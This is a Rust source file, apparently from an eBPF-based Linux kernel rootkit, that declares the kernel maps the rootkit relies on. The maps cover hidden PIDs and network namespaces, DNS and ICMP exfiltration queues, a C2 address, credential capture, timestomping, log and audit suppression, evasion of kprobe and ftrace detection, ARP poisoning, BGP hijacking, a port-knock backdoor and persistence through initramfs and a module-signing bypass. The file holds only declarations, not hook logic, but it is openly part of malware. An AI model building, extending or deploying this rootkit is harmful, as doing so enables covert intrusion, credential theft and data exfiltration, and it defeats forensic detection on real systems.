use aya_ebpf::{
    macros::map,
    maps::{HashMap, PerCpuArray, ProgramArray, RingBuf},
};
use common::{
    BgpHijackEntry, ContainerProbeResult, DnsExfilChunk, IcmpExfilPayload, PortKnockConfig,
    PortKnockState, ProcSpoofEntry, RootkitConfig, SlackHideEntry, TimestompEntry,
};

#[map]
pub(crate) static HIDDEN_PIDS: HashMap<u32, u8> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static CONFIG: HashMap<u32, RootkitConfig> = HashMap::with_max_entries(1, 0);

#[map]
pub(crate) static EVENTS: RingBuf = RingBuf::with_byte_size(256 * 1024, 0);

#[map]
pub(crate) static GETDENTS_BUFS: HashMap<u64, u64> = HashMap::with_max_entries(1024, 0);

#[map]
pub(crate) static GETDENTS_RETS: HashMap<u64, i64> = HashMap::with_max_entries(1024, 0);

#[map]
pub(crate) static MONITORED_TTYS: HashMap<u64, u8> = HashMap::with_max_entries(128, 0);

#[map]
pub(crate) static CRED_EVENTS: RingBuf = RingBuf::with_byte_size(64 * 1024, 0);

#[map]
pub(crate) static SPOOFED_PPIDS: HashMap<u32, u32> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static DNS_EXFIL_QUEUE: HashMap<u32, DnsExfilChunk> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static PROTECTED_PROG_IDS: HashMap<u32, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static TIMESTOMP_INODES: HashMap<u64, TimestompEntry> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static LOG_SUPPRESS_PATTERNS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static OBFUSCATE_INODES: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[derive(Clone, Copy)]
#[repr(C)]
pub(crate) struct VfsReadCtx {
    pub buf_ptr: u64,
    pub inode: u64,
    pub count: u64,
}

#[map]
pub(crate) static VFS_READ_ARGS: HashMap<u64, VfsReadCtx> = HashMap::with_max_entries(1024, 0);

#[repr(C)]
pub(crate) struct ScratchBuf {
    pub data: [u8; 4096],
}

#[map]
pub(crate) static SCRATCH_BUF: PerCpuArray<ScratchBuf> = PerCpuArray::with_max_entries(1, 0);

#[derive(Clone, Copy)]
#[repr(C)]
pub(crate) struct SyslogCtx {
    pub syslog_type: u32,
    pub _pad: u32,
    pub buf_ptr: u64,
    pub len: u64,
}

#[map]
pub(crate) static SYSLOG_ARGS: HashMap<u64, SyslogCtx> = HashMap::with_max_entries(256, 0);

#[derive(Clone, Copy)]
#[repr(C)]
pub(crate) struct GetattrCtx {
    pub kstat_ptr: u64,
    pub inode: u64,
}

#[map]
pub(crate) static GETATTR_ARGS: HashMap<u64, GetattrCtx> = HashMap::with_max_entries(256, 0);

#[map]
pub(crate) static AUDIT_CTX_PTRS: HashMap<u64, u64> = HashMap::with_max_entries(1024, 0);

#[map]
pub(crate) static DNS_EXFIL_SEQ: HashMap<u32, u32> = HashMap::with_max_entries(1, 0);

#[map]
pub(crate) static HIDDEN_NETNS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static OWN_PROG_IDS: HashMap<u32, u8> = HashMap::with_max_entries(64, 0);

#[derive(Clone, Copy)]
#[repr(C)]
pub(crate) struct BpfCmdCtx {
    pub cmd: u32,
    pub _pad: u32,
}

#[map]
pub(crate) static BPF_CMD_ARGS: HashMap<u64, BpfCmdCtx> = HashMap::with_max_entries(256, 0);

#[map]
pub(crate) static PROC_MODULES_INO: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static MEMFD_TRACKER: HashMap<u32, u64> = HashMap::with_max_entries(64, 0);

#[derive(Clone, Copy)]
#[repr(C)]
pub(crate) struct MemfdCtx {
    pub flags: u32,
    pub _pad: u32,
}

#[map]
pub(crate) static MEMFD_ARGS: HashMap<u64, MemfdCtx> = HashMap::with_max_entries(256, 0);

#[map]
pub(crate) static SYSLOG_FD_INODES: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static WIPE_FLAG: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static ICMP_EXFIL_QUEUE: HashMap<u32, IcmpExfilPayload> =
    HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static ICMP_C2_ADDR: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static ICMP_EXFIL_SEQ: HashMap<u32, u32> = HashMap::with_max_entries(1, 0);

#[map]
pub(crate) static HIJACK_TARGETS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static CONTAINER_STATE: aya_ebpf::maps::Array<ContainerProbeResult> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

// ──────────────────────────────────────────────
// Kernel Evasion Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static KPROBE_DETECT_STATE: HashMap<u64, u8> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static TAIL_CALL_PROGS: ProgramArray = ProgramArray::with_max_entries(16, 0);

#[map]
pub(crate) static FTRACE_BLIND_TARGETS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static BPF_ITER_STATE: HashMap<u32, u64> = HashMap::with_max_entries(16, 0);

// ──────────────────────────────────────────────
// Memory & Process Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static VDSO_HOOK_ADDRS: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(4, 0);

#[map]
pub(crate) static SHM_CHANNEL: RingBuf = RingBuf::with_byte_size(32 * 1024, 0);

#[map]
pub(crate) static UFFD_TARGETS: HashMap<u32, u64> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static COREDUMP_PIDS: HashMap<u32, u8> = HashMap::with_max_entries(64, 0);

// ──────────────────────────────────────────────
// Network Covert Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static ISN_COVERT_DATA: HashMap<u32, u32> = HashMap::with_max_entries(64, 0);

#[map]
pub(crate) static IPV6_EXT_QUEUE: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static ARP_POISON_TABLE: HashMap<u32, [u8; 6]> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static PORT_KNOCK_SEQ: HashMap<u32, PortKnockState> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static PORT_KNOCK_CONFIG: aya_ebpf::maps::Array<PortKnockConfig> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static BGP_HIJACK_PREFIXES: HashMap<u32, BgpHijackEntry> =
    HashMap::with_max_entries(16, 0);

// ──────────────────────────────────────────────
// Hardware Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static DR_WATCH_ADDRS: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(4, 0);

#[map]
pub(crate) static PMC_COVERT_DATA: HashMap<u32, u64> = HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static TSC_BASELINE: aya_ebpf::maps::Array<u64> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

// ──────────────────────────────────────────────
// Anti-Forensics Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static AUDIT_KILL_STATE: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static SLACK_HIDE_INODES: HashMap<u64, SlackHideEntry> =
    HashMap::with_max_entries(32, 0);

#[map]
pub(crate) static JOURNAL_TARGETS: HashMap<u64, u8> = HashMap::with_max_entries(16, 0);

#[map]
pub(crate) static PROC_SPOOF_PIDS: HashMap<u32, ProcSpoofEntry> = HashMap::with_max_entries(64, 0);

// ──────────────────────────────────────────────
// Advanced Persistence Maps
// ──────────────────────────────────────────────

#[map]
pub(crate) static INITRAMFS_STATE: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static MODSIGN_BYPASS_STATE: aya_ebpf::maps::Array<u32> =
    aya_ebpf::maps::Array::with_max_entries(1, 0);

#[map]
pub(crate) static BPF_PIN_PATHS: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);

// ──────────────────────────────────────────────
// Port Knock Allowlist (authenticated source IPs)
// ──────────────────────────────────────────────

#[map]
pub(crate) static PORT_KNOCK_ALLOWED: HashMap<u32, u8> = HashMap::with_max_entries(64, 0);
